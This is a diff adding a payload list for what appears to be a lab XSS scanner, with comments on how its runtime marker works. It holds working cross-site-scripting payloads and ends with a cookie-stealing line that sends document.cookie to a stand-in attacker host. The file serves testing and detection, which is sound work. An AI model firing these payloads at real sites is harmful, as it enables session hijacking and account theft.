@@ -1,0 +1,27 @@
+# Cross-Site-Scripting (XSS) payloads for weblab's xss engine.
+#
+# One payload per non-comment line; blank lines and lines starting with '#'
+# are ignored. The literal string MARKER (in upper-case) is substituted at
+# runtime with a per-run unique marker so the detector can tell its OWN echo
+# apart from anything already on the page, and so the recovered "proof" is the
+# planted xss flag.
+#
+# A safe app HTML-escapes these before echoing them, so the angle brackets come
+# back as &lt;...&gt; and none of this runs. The demo app echoes them verbatim,
+# so the raw <script> survives into the response -- that survival IS the bug.
+
+# --- the canonical script-tag injection (clearest signal) ---
+<script>MARKER</script>
+
+# --- attribute-breakout / event-handler variants (survive some naive filters) ---
+"><script>MARKER</script>
+<img src=x onerror=MARKER>
+<svg onload=MARKER>
+<body onload=MARKER>
+
+# --- javascript: URI and style variants ---
+<a href="javascript:MARKER">x</a>
+<iframe src="javascript:MARKER"></iframe>
+
+# --- the weaponised cookie-stealing proof-of-concept (the real exploit) ---
+<script>new Image().src='//attacker.example/c?'+document.cookie</script>
